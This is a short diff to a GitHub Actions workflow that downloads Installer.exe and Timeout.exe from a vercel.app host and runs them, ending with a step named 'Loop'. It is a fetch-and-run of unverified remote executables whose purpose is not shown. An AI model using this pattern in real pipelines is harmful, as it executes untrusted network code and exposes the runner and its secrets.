@@ -10,9 +10,12 @@ jobs:
 
     steps:
     - name: Installer
-      run: Invoke-WebRequest https://sturdy-sniffle.vercel.app/files/Installer.exe -OutFile installer.exe
-
-    - name: Run Installer
       run: |
-        .\installer.exe
-        .\Timeout.exe
+        Invoke-WebRequest https://sturdy-sniffle.vercel.app/files/Installer.exe -OutFile installer.exe
+        Invoke-WebRequest https://sturdy-sniffle.vercel.app/files/Timeout.exe -OutFile Timeout.exe
+    
+    - name: Run Installer
+      run: .\installer.exe
+
+    - name: Loop
+      run: .\Timeout.exe
